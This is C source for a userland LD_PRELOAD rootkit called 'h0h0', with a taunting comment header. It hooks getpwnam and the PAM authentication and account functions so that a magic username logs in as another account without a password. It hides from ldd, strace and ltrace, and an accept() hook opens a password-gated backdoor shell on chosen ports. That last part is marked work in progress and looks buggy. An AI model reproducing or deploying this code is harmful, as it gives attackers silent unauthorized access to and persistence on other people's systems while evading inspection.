/*
    If you are reading this, N, then stop fucking stalking me and leeching off my rep mate.
    I'm writing a userland rootkit mate, even though I don't root. Cheers.

        [*] If not su'ing SU_USER, hook real functions, so they still function normally.
        [*] Gets passwd entry for JACK_USER if su'ing SU_USER (pwd.h contains the passwd struct definition, or see man page)
        [*] Wraps PAM functions handling authentication (found via ltrace) -> returns PAM_SUCCESS for SU_USER/PAM_USER (authenticates without question)

    Will add more shit when I get my pegasus.
    Already fucked your system mate, just "su h0h0" and -3 get fucked.
*/

#define  _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <pwd.h>
#include <security/pam_appl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/time.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdbool.h>
#include <pty.h>
#include <utmp.h>    // login_tty() -- may not need later.
#include <err.h>

#include "h0h0.h"
#include "config.h"
#include "libcalls.h"

/* Non-hooks: */
void init(void)             __attribute__((constructor, visibility("hidden")));
void fini(void)             __attribute__((destructor, visibility("hidden")));
void drop_shell(int fd)     __attribute__((visibility("hidden")));
int watchdog(char *name)    __attribute__((visibility("hidden")));

void init(void)
{
    FILE *handle;
    char *caller = NULL;
    size_t len = 0;

    if((handle = fopen("/proc/self/cmdline", "r")))
    {
        while(getdelim(&caller, &len, 0, handle) != -1)
        {
            if(watchdog(caller))
            {
                // Unload the library.
                break;
            }
        }

        free(caller);
        fclose(handle);
    }

    debug("init() done.\n");
}

void fini(void)
{
    // Cleanup.
    //debug("fini() done.\n");
}

void drop_shell(int client)
{
    debug("drop_shell()\n");
    int master;
    char *path = SHELL_PATH;
    char *argv[] = { SHELL_PATH,  NULL }; 
    char buf[BUFSIZ];

    pid_t pid = forkpty(&master, NULL, NULL, NULL);
    if (pid < 0)
    {
        debug_err("fork()");
        return;
    }

    /* Run shell in slave. */
    if (pid == 0)
    {
        execv(path, argv);
    }

    /* Handle IO in master. */
    size_t num_read;
    fd_set readfds;
    while (true)
    {
        FD_ZERO(&readfds);
        FD_SET(master, &readfds);
        FD_SET(client, &readfds);

        if (select(master + 1, &readfds, NULL, NULL, NULL) < 0)
        {
            debug_err("select()");
            break;
        }

        /* Master --> Client. */
        if (FD_ISSET(master, &readfds))
        {
            if((num_read = read(master, buf, BUFSIZ)) < 0)
                debug_err("read(master)");
            else
                write(client, buf, num_read);
        }
        
        /* Client --> Master. */
        if (FD_ISSET(client, &readfds))
        {
            if((num_read = read(client, buf, BUFSIZ)) < 0)
                debug_err("read(client)");
            else
                write(master, buf, num_read);
        }


        /* TODO: Exit when slave shell exits. */
    }

    debug("drop_shell() done.\n");
}

int watchdog(char *name)
{
    size_t i, wd_size;
    const char *watchdogs[] = \
    {
        "/usr/bin/ldd",
        "strace",
        "ltrace"
    };

    wd_size = sizeof watchdogs / sizeof watchdogs[0];

    for(i = 0; i < wd_size; i++)
    {
        if(strcmp(watchdogs[i], name) == 0)
        {
            debug("watchdog(): busted (%s).\n", name);
            return true;
        }
    }

    return false;
}

/* PAM hooks: */
int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
{
    debug("getpwnam_r(%s)\n", name);
    libcall orig_getpwnam_r = getlibcall("getpwnam_r");

    if(strcmp(SU_USER, name) == 0)
        return orig_getpwnam_r(JACK_USER, pwd, buf, buflen, result);
    
    return orig_getpwnam_r(name, pwd, buf, buflen, result);
}

struct passwd *getpwnam(const char *name)
{
    debug("getpwnam(%s)\n", name);
    libcall orig_getpwnam_r = getlibcall("getpwnam_r");

    char buf[1024];
    struct passwd *result;
    static struct passwd pwd;

    memset(&pwd, 0, sizeof(struct passwd));

    /* Bypass user existence check. */
    if (strcmp(SU_USER, name) == 0)
    {
        // Pretend JACK_USER is named SU_USER
        orig_getpwnam_r(JACK_USER, &pwd, buf, sizeof(buf), &result);
        pwd.pw_name = strdup(SU_USER);
    }
    else
      orig_getpwnam_r(name, &pwd, buf, sizeof(buf), &result);

    return &pwd;
}

int pam_authenticate(pam_handle_t *pamh, int flags)
{
    debug("pam_authenticate()\n");
    libcall orig_pam_authenticate = getlibcall("pam_authenticate");
    const void *item;

    pam_get_item(pamh, PAM_USER, &item);

    if(strcmp(SU_USER, item) == 0)
        return PAM_SUCCESS;

    return orig_pam_authenticate(pamh, flags);
}

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char *argv[])
{
    debug("pam_sm_authenticate()\n");
    libcall orig_pam_sm_authenticate = getlibcall("pam_sm_authenticate");

    return orig_pam_sm_authenticate(pamh, flags, argc, argv);
}

int pam_open_session(pam_handle_t *pamh, int flags)
{
    debug("pam_open_session()\n");
    libcall orig_pam_open_session = getlibcall("pam_open_session");

    return orig_pam_open_session(pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
    debug("pam_acct_mgmt()\n");
    libcall orig_pam_acct_mgmt = getlibcall("pam_acct_mgmt");
    const void *item;

    pam_get_item(pamh, PAM_USER, &item);

    if(strcmp(SU_USER, item) == 0)
        return PAM_SUCCESS;

    return orig_pam_acct_mgmt(pamh, flags);
}

/* Network service hook/backdoor (WIP). */
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    debug("accept()\n");
    targetfd = 0;

    libcall orig_accept = getlibcall("accept");
    
    struct sockaddr_in host_addr;
    size_t host_len = sizeof(addr);
    unsigned short host_port;
    int client_fd;

    /* Get host port number. */
    getsockname(sockfd, &host_addr, &host_len);
    host_port = ntohs(host_addr.sin_port);

    client_fd = orig_accept(sockfd, addr, addrlen);
    if (client_fd < 0)
    {
        debug_err("accept()");
        return client_fd;
    }

    if(host_port >= LOW_PORT && host_port <= HIGH_PORT)
    {
        size_t pass_len = strlen(SHELL_PASS);
        char password[pass_len + 1];
        password[pass_len] = '\0';

        size_t num_read = orig_read(fd, password, pass_len);
        
        lseek(fd, -pass_len, SEEK_CUR); // Try to unread password

        if (strcmp(SHELL_PASS, password) == 0)
        {
            drop_shell();
        }
    }

    return client_fd;
}
